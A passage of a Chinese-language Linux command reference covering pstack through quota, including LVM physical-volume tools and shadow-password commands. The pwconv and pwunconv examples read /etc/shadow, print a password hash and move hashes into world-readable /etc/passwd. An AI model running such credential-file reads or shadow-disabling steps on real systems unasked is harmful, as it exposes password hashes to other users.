命令】pstack","url":"/linux-command/pstack/","content":"\n显示每个进程的栈跟踪\n\n## 补充说明\n\n**pstack命令** 可显示每个进程的栈跟踪。<kbd>pstack</kbd> 命令必须由相应进程的属主或 <tt>root</tt> 运行。可以使用 <kbd>pstack</kbd> 来确定进程挂起的位置。此命令允许使用的唯一选项是要检查的进程的 <tt>PID</tt>。\n\n命令软件包下载地址：https://packages.debian.org/sid/pstack\n\n###  实例\n\npstree以树结构显示进程\n\n```shell\npstree -p work | grep ad\nsshd(22669)---bash(22670)---ad_preprocess(4551)-+-{ad_preprocess}(4552)\n                                                |-{ad_preprocess}(4553)\n                                                |-{ad_preprocess}(4554)\n                                                |-{ad_preprocess}(4555)\n                                                |-{ad_preprocess}(4556)\n                                                `-{ad_preprocess}(4557)\n```\n\nwork为工作用户，-p为显示进程识别码，ad_preprocess共启动了6个子线程，加上主线程共7个线程。\n\n```shell\nps -Lf 4551\nUID        PID  PPID   LWP  C NLWP STIME TTY      stat   time CMD\nwork      4551 22670  4551  2    7 16:30 pts/2    Sl+    0:02 ./ad_preprocess\nwork      4551 22670  4552  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4553  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4554  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4555  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4556  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4557  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\n```\n\n进程共启动了7个线程\n\npstack显示每个进程的栈跟踪：\n\n```shell\npstack 4551\nThread 7 (Thread 1084229984 (LWP 4552)):\n#0  0x000000302afc63dc in epoll_wait () from /lib64/tls/libc.so.6\n#1  0x00000000006f0730 in ub::EPollEx::poll ()\n#2  0x00000000006f172a in ub::NetReactor::callback ()\n#3  0x00000000006fbbbb in ub::UBTask::CALLBACK ()\n#4  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#5  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#6  0x0000000000000000 in ?? ()\nThread 6 (Thread 1094719840 (LWP 4553)):\n#0  0x000000302afc63dc in epoll_wait () from /lib64/tls/libc.so.6\n#1  0x00000000006f0730 in ub::EPollEx::poll ()\n#2  0x00000000006f172a in ub::NetReactor::callback ()\n#3  0x00000000006fbbbb in ub::UBTask::CALLBACK ()\n#4  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#5  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#6  0x0000000000000000 in ?? ()\nThread 5 (Thread 1105209696 (LWP 4554)):\n#0  0x000000302b80baa5 in __nanosleep_nocancel ()\n#1  0x000000000079e758 in comcm::ms_sleep ()\n#2  0x00000000006c8581 in ub::UbClientManager::healthyCheck ()\n#3  0x00000000006c8471 in ub::UbClientManager::start_healthy_check ()\n#4  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#5  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#6  0x0000000000000000 in ?? ()\nThread 4 (Thread 1115699552 (LWP 4555)):\n#0  0x000000302b80baa5 in __nanosleep_nocancel ()\n#1  0x0000000000482b0e in armor::armor_check_thread ()\n#2  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#3  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#4  0x0000000000000000 in ?? ()\nThread 3 (Thread 1126189408 (LWP 4556)):\n#0  0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6\n#1  0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6\n#2  0x000000000044c972 in Business_config_manager::run ()\n#3  0x0000000000457b83 in Thread::run_thread ()\n#4  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#5  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#6  0x0000000000000000 in ?? ()\nThread 2 (Thread 1136679264 (LWP 4557)):\n#0  0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6\n#1  0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6\n#2  0x00000000004524bb in Process_thread::sleep_period ()\n#3  0x0000000000452641 in Process_thread::run ()\n#4  0x0000000000457b83 in Thread::run_thread ()\n#5  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#6  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#7  0x0000000000000000 in ?? ()\nThread 1 (Thread 182894129792 (LWP 4551)):\n#0  0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6\n#1  0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6\n#2  0x0000000000420d79 in Ad_preprocess::run ()\n#3  0x0000000000450ad0 in main ()\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pstack"]},{"title":"【Linux 命令】pstree","url":"/linux-command/pstree/","content":"\n以树状图的方式展现进程之间的派生关系\n\n## 补充说明\n\n**pstree命令** 以树状图的方式展现进程之间的派生关系，显示效果比较直观。\n\n###  语法 \n\n```shell\npstree(选项)\n```\n\n###  选项 \n\n```shell\n-a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示；\n-c：不使用精简标示法；\n-G：使用VT100终端机的列绘图字符；\n-h：列出树状图时，特别标明现在执行的程序；\n-H<程序识别码>：此参数的效果和指定\"-h\"参数类似，但特别标明指定的程序；\n-l：采用长列格式显示树状图；\n-n：用程序识别码排序。预设是以程序名称来排序；\n-p：显示程序识别码；\n-u：显示用户名称；\n-U：使用UTF-8列绘图字符；\n-V：显示版本信息。\n```\n\n###  实例 \n\n显示当前所有进程的进程号和进程id\n\n```shell\npstree -p\n```\n\n显示所有进程的所有详细信息，遇到相同的进程名可以压缩显示。\n\n```shell\npstree  -a\n```\n\n获取 SSH 会话的 PID\n\n```shell\npstree -p | grep ssh\n\n#  |-sshd(1221)-+-sshd(2768)---bash(2770)-+-grep(2810)\n#  |            `-sshd(2807)---sshd(2808)\n```\n\n从上方的输出中，你可以看到 sshd 进程与分支的树形图。sshd 的主进程是 sshd（1221），另两个分支分别为 sshd（2768） 和 sshd（2807）。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pstree"]},{"title":"【Linux 命令】pushd","url":"/linux-command/pushd/","content":"\n将目录添加到目录堆栈顶部。\n\n## 概要\n\n```shell\npushd [-n] [+N | -N | dir]\n```\n\n## 主要用途\n\n- 将目录添加到目录堆栈顶部，切换当前工作目录到该目录。\n\n- 旋转目录堆栈，使堆栈的新顶部成为当前工作目录。\n\n- 没有参数时，交换目录堆栈的前两个目录。\n\n## 选项\n\n```shell\n-n    抑制添加目录引起的当前工作目录变化。\n```\n\n## 参数\n\n+N（可选）：不带参数执行`dirs`命令显示的列表中，左起的第N个目录将作为堆栈顶部，在它前面的会移动到底部。（从0开始计数）\n\n-N（可选）：不带参数执行`dirs`命令显示的列表中，右起的第N个目录将作为堆栈顶部，在它前面的会移动到底部。（从0开始计数）\n\ndir（可选）：要推送的目录。\n\n## 返回值\n\n返回成功除非提供了非法选项或执行出现错误。\n\n## 例子\n\n```shell\n# 添加目录到堆栈，改变了当前工作目录。\n[user2@pc ~]$ dirs\n~\n[user2@pc ~]$ pushd ~/Desktop\n~/Desktop ~\n[user2@pc Desktop]$ \n```\n\n```shell\n# 添加目录到堆栈，当前工作目录不变。\n[user2@pc ~]$ dirs\n~\n[user2@pc ~]$ pushd -n ~/Desktop\n~ ~/Desktop\n[user2@pc ~]$ pushd -n ~/Pictures\n~ ~/Pictures ~/Desktop\n\n# 调整顺序。\n[user2@pc ~]$ pushd +1\n~/Pictures ~/Desktop ~\n[user2@pc ~]$ pushd -1\n~/Desktop ~ ~/Pictures\n[user2@pc ~]$ pushd\n~ ~/Desktop ~/Pictures\n```\n\n### 注意\n\n1. `bash`的目录堆栈命令包括`dirs popd pushd`。\n2. 当前目录始终是目录堆栈的顶部。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n### 参考链接\n\n- [popd、pushd命令'-n'选项的行为](https://superuser.com/questions/784450/popd-and-pushd-behavior-with-n-option)\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pushd"]},{"title":"【Linux 命令】pv","url":"/linux-command/pv/","content":"\n显示当前在命令行执行的命令的进度信息，管道查看器\n\n## 补充说明\n\n**pv命令**  Pipe Viewer 的简称，由Andrew Wood 开发。意思是通过管道显示数据处理进度的信息。这些信息包括已经耗费的时间，完成的百分比(通过进度条显示)，当前的速度，全部传输的数据，以及估计剩余的时间。\n\n## 下载安装\n\n```shell\n# Debian 系的操作系统，如 Ubuntu\nsudo apt-get install pv\n\n# RedHat系的则这样：\nyum install pv\n```\n\n###  语法\n\n```shell\npv(选项)(参数)\npv [OPTION] [FILE]...\n```\n\n###  选项\n\n```shell\n-p, --progress           显示进度条\n-t, --timer              显示已用时间\n-e, --eta                显示预计到达时间 (完成)\n-I, --fineta             显示绝对估计到达时间\n                         (完成)\n-r, --rate               显示数据传输速率计数器\n-a, --average-rate       显示数据传输平均速率计数器\n-b, --bytes              显示传输的字节数\n-T, --buffer-percent     显示正在使用的传输缓冲区百分比\n-A, --last-written NUM   显示上次写入的字节数\n-F, --format FORMAT      将输出格式设置为FORMAT\n-n, --numeric            输出百分比\n-q, --quiet              不输出任何信息\n\n-W, --wait               在传输第一个字节之前不显示任何内容\n-D, --delay-start SEC    在SEC秒过去之前不显示任何内容\n-s, --size SIZE          将估算的数据大小设置为SIZE字节\n-l, --line-mode          计算行数而不是字节数 \n-0, --null               行以零结尾\n-i, --interval SEC       每SEC秒更新一次\n-w, --width WIDTH        假设终端的宽度为WIDTH个字符 \n-H, --height HEIGHT      假设终端高度为HEIGHT行\n-N, --name NAME          在可视信息前面加上名称\n-f, --force              将标准错误输出到终端\n-c, --cursor             使用光标定位转义序列\n\n-L, --rate-limit RATE    将传输限制为每秒RATE字节\n-B, --buffer-size BYTES  使用BYTES的缓冲区大小\n-C, --no-splice          从不使用splice()，始终使用读/写\n-E, --skip-errors        跳过输入中的读取错误\n-S, --stop-at-size       传输--size字节后停止\n-R, --remote PID         更新过程PID的设置\n\n-P, --pidfile FILE       将进程ID保存在FILE中 \n\n-d, --watchfd PID[:FD]   监视进程PID,打开的文件FD\n\n-h, --help               显示帮助\n-V, --version            显示版本信息\n```\n\n\n###  实例\n\n我们（在 linux 上使用命令行的用户）的大多数使用场景都会用到的命令是从一个 USB 驱动器拷贝电影文件到你的电脑。如果你使用 cp 来完成上面的任务，你会什么情况都不清楚，直到整个复制过程结束或者出错。\n\n```shell\n# 复制文件会有进度\nlinux [master●] % pv ~/Downloads/CentOS-7-x86_64-Minimal-1511.iso > ~/Desktop/CentOS-7-x86_64-Minimal-1511.iso\n# 下面输入信息\n552MiB 0:00:02 [ 212MiB/s] [==================>           ] 91% ETA 0:00:00\n\n# -L 可以让你修改 pv 命令的传输速率。\n# 使用 -L 选项来限制传输速率为2MB/s。\npv -L 2m /media/himanshu/1AC2-A8E3/fNf.mkv > ./Desktop/fnf.mkv \n```\n\n\n```shell\n# 字符一个个匀速在命令行中显示出来\necho \"Tecmint[dot]com is a community of Linux Nerds and Geeks\" | pv -qL 10\n\n# 压缩文件展示进度信息\npv /media/himanshu/1AC2-A8E3/fnf.mkv | gzip > ./Desktop/fnf.log.gz \n\n\n# 用 dd 命令将 iso 写入磁盘，pv来实现进度条的显示\nsudo pv -cN source < /Users/kacperwang/Downloads/CentOS-7-x86_64-Everything-1511.iso | sudo dd of=/dev/disk2 bs=4m\n## 显示下面进度\nsource:  5.2GiB 5:11:41 [ 503KiB/s] [=====================>       ] 71% ETA 2:01:56\n```\n\n在linux上, 如果执行的一些命令或者一些脚本需要花费很长时间, 但又不能拿出更多的精力反复盯着有没有执行结束, 这时候可以用pv监听PID, 任务完成后通过网络通知到微信或者钉钉, 这样就可以腾出来精力做其他的事, 是不是很棒\n\n```shell\n$ pv -d $(ps -ef | grep -v grep | grep \"<脚本或命令的关键字>\" | awk '{print $2}') && <这里执行发通知脚本或者命令,脚本或命令需要提前调试好>\n```\n\n### 注意\n\n1. 选项\"-d, --watchfd PID[:FD]\", 是在1.6.6版本中才有的参数,如果使用需要`pv`升级到大于等于1.6.6的版本\n2. CentOS7的Yum仓库里`pv`最新的是1.4.6版本,1.6.6版本是发布在CentOS8里面的,如果需要,可以将CentOS8里的pv下载到本地电脑上或者本地的Yum私服里, 这个是[下载地址](http://www.rpmfind.net/linux/rpm2html/search.php?query=pv&submit=Search+...&system=EPEL&arch=), 可以根据自己不同的架构下载, 1.6.6的安装: `rpm -ivh pv-1.6.6-7.el8.x86_64.rpm -U`\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pv"]},{"title":"【Linux 命令】pvchange","url":"/linux-command/pvchange/","content":"\n修改物理卷属性\n\n## 补充说明\n\n**pvchange命令** 允许管理员改变物理卷的分配许可。如果物理卷出现故障，可以使用pvchange命令禁止分配物理卷上的PE。\n\n### 语法\n\n```shell\npvchange(选项)(参数)\n```\n\n### 选项\n\n```shell\n-u：生成新的UUID；\n-x：是否允许分配PE。\n```\n\n### 参数\n\n物理卷：指定要修改属性的物理卷所对应的设备文件。\n\n### 实例\n\n使用pvchange命令禁止分配指定物理卷上的PE。在命令行中输入下面的命令：\n\n```shell\npvchange -x n /dev/sdb1     #禁止分配\"/dev/sdb1\"上的PE\n```\n\n输出信息如下：\n\n```shell\nPhysical volume \"/dev/sdb1\" changed  \n1 physical volume changed / 0 physical volumes not changed\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pvchange"]},{"title":"【Linux 命令】pvck","url":"/linux-command/pvck/","content":"\n检测物理卷的LVM元数据的一致性\n\n## 补充说明\n\n**pvck命令** 用来检测物理卷的LVM元数据的一致性。默认情况下，物理卷中的前4个扇区保存着LVM卷标，可以使用`--labelsector`选项指定其他的位置（例如：数据恢复时）。\n\n###  语法\n\n```shell\npvck(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：调试模式；\n-v：详细信息模式；\n--labelsector：指定LVE卷标所在扇区。\n```\n\n###  参数\n\n物理卷：指定要检查的物理卷对应的设备文件。\n\n###  实例\n\n使用pvck命令检查物理卷`/dev/sdb1`。在命令行中输入下面的命令：\n\n```shell\npvck -v /dev/sdb1    #检查物理卷元数据\nScanning /dev/sdb1  \nFound label on /dev/sdb1, sector 1, type=LVM2 001  \nFound text metadata area: offset=4096, size=192512 \nFound LVM2 metadata record at offset=125952,  \nsize=70656, offset2=0 size2=0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pvck"]},{"title":"【Linux 命令】pvcreate","url":"/linux-command/pvcreate/","content":"\n将物理硬盘分区初始化为物理卷\n\n## 补充说明\n\n**pvcreate命令** 用于将物理硬盘分区初始化为物理卷，以便LVM使用。\n\n###  语法\n\n```shell\npvcreate(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：强制创建物理卷，不需要用户确认；\n-u：指定设备的UUID；\n-y：所有的问题都回答“yes”；\n-Z：是否利用前4个扇区。\n```\n\n###  参数\n\n物理卷：指定要创建的物理卷对应的设备文件名。\n\n###  实例\n\n查看磁盘信息：\n\n```shell\n[root@localhost ~]# fdisk -l\nDisk /dev/hda: 41.1 GB, 41174138880 bytes\n255 heads, 63 sectors/track, 5005 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n\n   Device Boot      Start         End      Blocks   id  System\n/dev/hda1   *           1          13      104391   83  Linux\n/dev/hda2              14        1288    10241437+  83  Linux\n/dev/hda3            1289        1925     5116702+  83  Linux\n/dev/hda4            1926        5005    24740100    5  Extended\n/dev/hda5            1926        2052     1020096   82  Linux swap / Solaris\n/dev/hda6            2053        2235     1469916   8e  Linux LVM\n/dev/hda7            2236        2418     1469916   8e  Linux LVM\n/dev/hda8            2419        2601     1469916   8e  Linux LVM\n/dev/hda9            2602        2784     1469916   8e  Linux LVM\n```\n\n检查有无 PV 在系统上，然后将`/dev/hda6`到`/dev/hda9`建立成为PV格式\n\n```shell\n[root@localhost ~]# pvscan\nNo matching physical volumes found    #找不到任何的 PV 存在！\n```\n\n将6-9分区转成pv，注意大括号的用途：\n\n```shell\n[root@localhost ~]# pvcreate /dev/hda{6,7,8,9}\n  Physical volume \"/dev/hda6\" successfully created\n  Physical volume \"/dev/hda7\" successfully created\n  Physical volume \"/dev/hda8\" successfully created\n  Physical volume \"/dev/hda9\" successfully created\n```\n\n这就分別表示每个 PV 的信息与系统所有 PV 的信息：\n\n```shell\n[root@localhost ~]# pvscan\n  PV /dev/hda6         lvm2 [1.40 GB]\n  PV /dev/hda7         lvm2 [1.40 GB]\n  PV /dev/hda8         lvm2 [1.40 GB]\n  PV /dev/hda9         lvm2 [1.40 GB]\n  Total: 4 [5.61 GB] / in use: 0 [0   ] / in no VG: 4 [5.61 GB]\n```\n\n更详细的列示出系统上面每个 PV 信息：\n\n```shell\n[root@localhost ~]# pvdisplay\n  \"/dev/hda6\" is a new physical volume of \"1.40 GB\"\n  --- NEW Physical volume ---\n  PV Name               /dev/hda6  #实际的 partition 分区名称\n  VG Name                          #因为尚未分配出去，所以空白！\n  PV Size               1.40 GB    #就是容量说明\n  Allocatable           NO         #是否已被分配，结果是 NO\n  PE Size (KByte)       0          #在此 PV 內的 PE 大小\n  Total PE              0          #共分割出几个 PE\n  free PE               0          #沒被 LV 用掉的 PE\n  Allocated PE          0          #尚可分配出去的 PE 数量\n  PV UUID               Z13Jk5-RCls-UJ8B-HzDa-Gesn-atku-rf2biN\n....(底下省略)....\n```\n\n删除物理卷：\n\n```shell\n[root@localhost ~]# pvremove /dev/sdb2\nLabels on physical volume \"/dev/sdb2\" successfully wiped\n```\n\n修改物理卷属性：\n\n```shell\n[root@localhost ~]# pvchange -x n /dev/sdb1    #禁止分配指定物理卷上的PE\nPhysical volume \"/dev/sdb1\" changed  \n1 physical volume changed / 0 physical volumes not changed \n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pvcreate"]},{"title":"【Linux 命令】pvdisplay","url":"/linux-command/pvdisplay/","content":"\n显示物理卷的属性\n\n## 补充说明\n\n**pvdisplay命令** 用于显示物理卷的属性。pvdisplay命令显示的物理卷信息包括：物理卷名称、所属的卷组、物理卷大小、PE大小、总PE数、可用PE数、已分配的PE数和UUID。\n\n###  语法\n\n```shell\npvdisplay(选项)(参数)\n```\n\n###  选项\n\n```shell\n-s：以短格式输出；\n-m：显示PE到LE的映射。\n```\n\n###  参数\n\n物理卷：要显示的物理卷对应的设备文件名。\n\n###  实例\n\n使用pvdisplay命令显示指定的物理卷的基本信息。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# pvdisplay /dev/sdb1    #显示物理卷基本信息\n```\n\n输出信息如下：\n\n```shell\n\"/dev/sdb1\" is a new physical volume of \"101.94 MB\"  \n--- NEW Physical volume ---  \nPV Name               /dev/sdb1  \n....省略部分输出内容......  \nPV UUID         FOXiS2-Ghaj-Z0Mf- cdVZ-pfpk- dP9p-ifIZXN\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pvdisplay"]},{"title":"【Linux 命令】pvremove","url":"/linux-command/pvremove/","content":"\n删除一个存在的物理卷\n\n## 补充说明\n\n**pvremove命令** 用于删除一个存在的物理卷。使用pvremove指令删除物理卷时，它将LVM分区上的物理卷信息删除，使其不再被视为一个物理卷。\n\n###  语法\n\n```shell\npvremove(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d # 调试模式；\n-f # 强制删除；\n-y # 对提问回答“yes”。\n```\n\n###  参数\n\n物理卷：指定要删除的物理卷对应的设备文件名。\n\n###  实例\n\n使用pvremove指令删除物理卷`/dev/sdb2`。在命令行中输入下面的命令：\n\n```shell\npvremove /dev/sdb2 # 删除物理卷\nLabels on physical volume \"/dev/sdb2\" successfully wiped\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pvremove"]},{"title":"【Linux 命令】pvs","url":"/linux-command/pvs/","content":"\n输出物理卷信息报表\n\n## 补充说明\n\n**pvs命令** 用于输出格式化的物理卷信息报表。使用pvs命令仅能得到物理卷的概要信息，如果要得到更加详细的信息可以使用pvdisplay命令。\n\n###  语法\n\n```shell\npvs(选项)(参数)\n```\n\n###  选项\n\n```shell\n--noheadings：不输出标题头；\n--nosuffix：不输出空间大小的单位。\n```\n\n###  参数\n\n物理卷：要显示报表的物理卷列表。\n\n###  实例\n\n使用pvs命令显示系统中所有物理卷的信息报表。在命令行中输入下面的命令：\n\n```shell\npvs # 输出物理卷信息报表 \n```\n\n输出信息如下：\n\n```shell\nPV         VG     fmt  Attr PSize   PFree  \n/dev/sdb1  vg1000 lvm2 --   100.00M 100.00M  \n/dev/sdb2         lvm2 --   101.98M 101.98M\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pvs"]},{"title":"【Linux 命令】pvscan","url":"/linux-command/pvscan/","content":"\n扫描系统中所有硬盘的物理卷列表\n\n## 补充说明\n\n**pvscan命令** 会扫描系统中连接的所有硬盘，列出找到的物理卷列表。使用pvscan命令的`-n`选项可以显示硬盘中的不属于任何卷组的物理卷，这些物理卷是未被使用的。\n\n###  语法\n\n```shell\npvscan(选项)\n```\n\n###  选项\n\n```shell\n-d：调试模式；\n-e：仅显示属于输出卷组的物理卷；\n-n：仅显示不属于任何卷组的物理卷；\n-s：短格式输出；\n-u：显示UUID。\n```\n\n###  实例\n\n使用pvscan命令扫描当前系统中所有硬盘的物理卷，在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# pvscan     #扫描所有硬盘上的物理卷 \n```\n\n输出信息如下：\n\n```shell\nPV /dev/sdb1         lvm2 [101.94 MB]  \nPV /dev/sdb2         lvm2 [101.98 MB]  \nTotal: 2 [203.92 MB] / in use: 0 [0   ] / in no VG: 2 [203.92  \nMB] \n```\n\n说明：本例中，输出了两个物理卷，它们不属于任何卷组，是可被利用的物理卷。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pvscan"]},{"title":"【Linux 命令】pwck","url":"/linux-command/pwck/","content":"\n用来验证系统认证文件内容和格式的完整性\n\n## 补充说明\n\n**pwck命令** 用来验证系统认证文件`/etc/passwd`和`/etc/shadow`的内容和格式的完整性。\n\n###  语法\n\n```shell\npwck(选项)(参数)\n```\n\n###  选项\n\n```shell\n-q：仅报告错误信息；\n-s：以用户id排序文件“/etc/passwd”和“/etc/shadow”;\n-r：只读方式运行指令。\n```\n\n###  参数\n\n*   密码文件：指定密码文件的路径；\n*   影子文件：指定影子文件的路径。\n\n###  实例\n\n```shell\npwck /etc/passwd\nuser 'lp': directory '/var/spool/lpd' does not exist\nuser 'news': directory '/var/spool/news' does not exist\nuser 'uucp': directory '/var/spool/uucp' does not exist\nuser 'www-data': directory '/var/www' does not exist\nuser 'list': directory '/var/list' does not exist\nuser 'irc': directory '/var/run/ircd' does not exist\nuser 'gnats': directory '/var/lib/gnats' does not exist\nuser 'nobody': directory '/nonexistent' does not exist\nuser 'syslog': directory '/home/syslog' does not exist\nuser 'couchdb': directory '/var/lib/couchdb' does not exist\nuser 'speech-dispatcher': directory '/var/run/speech-dispatcher' does not exist\nuser 'usbmux': directory '/home/usbmux' does not exist\nuser 'haldaemon': directory '/var/run/hald' does not exist\nuser 'pulse': directory '/var/run/pulse' does not exist\nuser 'saned': directory '/home/saned' does not exist\nuser 'hplip': directory '/var/run/hplip' does not exist\npwck：无改变\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pwck"]},{"title":"【Linux 命令】pwconv","url":"/linux-command/pwconv/","content":"\n用来开启用户的投影密码\n\n## 补充说明\n\n**pwconv命令** 用来开启用户的投影密码。Linux系统里的用户和群组密码，分别存放在名称为passwd和group的文件中， 这两个文件位于`/etc`目录下。因系统运作所需，任何人都得以读取它们，造成安全上的破绽。投影密码将文件内的密码改存在`/etc`目录下的shadow和gshadow文件内，只允许系统管理者读取，同时把原密码置换为\"x\"字符，有效的强化了系统的安全性。\n\n###  语法\n\n```shell\npwconv\n```\n\n###  实例\n\n```shell\ncat /etc/passwd | grep test\ntest:x:3001:3001::/home/test:/bin/sh\n```\n\n此时可以发现密码段是x\n\n```shell\ncat /etc/shadow | grep test\ntest:$6$nYOEWamm$bz07nlv/.RgJufb3FAqJJeULfwybzgxmrWqbk7O4vI0KsT6N.ujrh6dDIUcAJdfjksyuyAFDPIngZeD3cgcf.0:15022:0:99999:7:::\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pwconv"]},{"title":"【Linux 命令】pwd","url":"/linux-command/pwd/","content":"\n显示当前工作目录的绝对路径。\n\n## 目录\n\n- [bash内建命令](#内建命令)\n- [GNU coreutils中的命令](#外部命令)\n\n## 内建命令\n\n#### 概要\n\n```shell\npwd [-LP]\n```\n\n#### 主要用途\n\n- 显示当前工作目录。\n\n#### 选项\n\n```shell\n-L （默认值）打印环境变量\"$PWD\"的值，可能为符号链接。\n-P 打印当前工作目录的物理位置。\n```\n\n#### 返回值\n\n返回状态为成功除非给出了非法选项或是当前目录无法读取。\n\n#### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n## 外部命令\n\n#### 概要\n\n```shell\npwd [OPTION]...\n```\n\n#### 主要用途\n\n- 显示当前工作目录。\n\n\n#### 选项\n\n```shell\n-L, --logical 打印环境变量\"$PWD\"的值，可能为符号链接。\n-P, --physical （默认值）打印当前工作目录的物理位置。\n--help 显示帮助信息并退出。\n--version 显示版本信息并退出。\n```\n\n#### 返回值\n\n返回状态为成功除非给出了非法选项或是当前目录无法读取。\n\n#### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man pwd`或`info coreutils 'pwd invocation'`。\n2. 启动或关闭内建命令请查看`enable`命令，关于同名优先级的问题请查看`builtin`命令的例子部分的相关讨论。\n3. 在不禁用内建且当前环境没有定义`pwd`函数的情况下，使用`/usr/bin/pwd`指向`coreutils`的`pwd`，使用`pwd`指向bash内建的`pwd`。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pwd"]},{"title":"【Linux 命令】pwunconv","url":"/linux-command/pwunconv/","content":"\n用来关闭用户的投影密码\n\n## 补充说明\n\n**pwunconv命令** 与pwconv功能相反，用来关闭用户的投影密码。它会把密码从shadow文件内，重回存到passwd文件里。\n\n###  语法\n\n```shell\npwunconv\n```\n\n###  实例\n\n```shell\npwunconv     # 关闭影子密码\ncat /etc/passwd | grep test     # 发现密码已经在passwd文件中了\ntest:$6$nYOEWamm$bz07nlv/.RgJufb3FAqJJeULfwybzgxmrWqbk7O4vI0KsT6N.ujrh6dDIUcAJdfjksyuyAFDPIngZeD3cgcf.0:3001:3001::/home/test:/bin/sh\n\nls /etc/shadow     # 查看影子文件，提示没有这个文件或目录\nls: cannot access /etc/shadow: No such file or directory\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pwunconv"]},{"title":"【Linux 命令】quota","url":"/linux-command/quota/","content":"\n显示磁盘已使用的空间与限制\n\n## 补充说明\n\n**quota命令** 用于显示用户或者工作组的磁盘配额信息。输出信息包括磁盘使用和配额限制。\n\n###  语法\n\n```shell\nquota(选项)(参数)\n```\n\n###  选项\n\n```shell\n-g：列出群组的磁盘空间限制；\n-q：简明列表，只列出超过限制的部分；\n-u：列出用户的磁盘空间限制；\n-v：显示该用户或群组，在所有挂入系统的存储设备的空间限制；\n-V：显示版本信息。\n```\n\n###  参数\n\n用户或者工作组：指定要显示的用户或者工作组。\n\n###  实例\n\n我们可以限制某一群组所能使用的最大磁盘配额，而且可以再限制某一使用者的最大磁盘配额 ，好比做一个收费的应用，vip可以得到空间更大一些。另外，以 Link 的方式，来使邮件可以作为限制的配额（更改`/var/spool/mail` 这个路径），不2，需要重新再规划一个硬盘！直接使用 Link 的方式指向 /home （或者其它已经做好的 quota 磁盘）就可以！这通常是用在原本规划不好，但是却又不想要更动原有主机架构的情况中！\n\n要求：Linux 主机里面主要针对 quser1 及 quser2 两个使用者来进行磁盘配额， 且这两个使用者都是挂在 qgroup 组里面的。每个使用者总共有 50MB 的磁盘空间 (不考虑 inode) 限制！并且 soft limit 为 45 MB；而宽限时间设定为 1 天， 但是在一天之内必须要将多余的文件删除掉，否则将无法使用剩下的空间 ；gquota 这个组考虑最大限额，所以设定为 90 MB！（注意，这样设置的好处是富有弹性，好比现在的邮件服务，那么多用户，承诺给用户每人最大空间为数GB，然而人们不可能每人都会使用那么大的空间，所以邮件服务的总空间，实际上肯定不是注册客户数乘以数GB，否则这样得多大啊。）\n\n```shell\n[root@localhost ~]# groupadd qgroup\n[root@localhost ~]# useradd -m -g qgroup quser1\n[root@localhost ~]# useradd -m -g qgroup quser2\n[root@localhost ~]# passwd quser1\n[root@localhost ~]# passwd quser2\n[root@localhost ~]# df     ===>  自己找一个合适的分区来做实验，这里用/disk2\nFilesystem             1K-blocks        Used      Available   Use% Mounted on\n/dev/hda1              5952252   3193292     2451720     57%     /\n/dev/hdb1            28267608       77904   26730604       1%     /disk2\n/dev/hda5              9492644     227252     8775412       3%     /disk1\n\n[root@localhost ~]# vi /etc/fstab\nLABEL=/             /                ext3      defaults                                     1 1\nLABEL=/disk1    /disk1        ext3      defaults                                      1 2\nLABEL=/disk2    /disk2        ext3      defaults,usrquota,grpquota       1 2  \n/dev/hda3         swap         swap     defaults                                     0 